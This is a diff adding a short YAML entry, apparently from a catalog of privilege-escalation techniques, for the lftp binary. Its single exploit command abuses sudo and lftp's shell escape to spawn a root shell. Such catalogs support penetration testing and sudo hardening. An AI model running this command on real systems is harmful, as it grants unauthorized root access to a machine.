@@ -1,0 +1,4 @@
+name: lftp
+binary_path: /usr/bin/lftp
+exploit_cmds:
+- sudo /usr/bin/lftp -c '!/bin/sh'
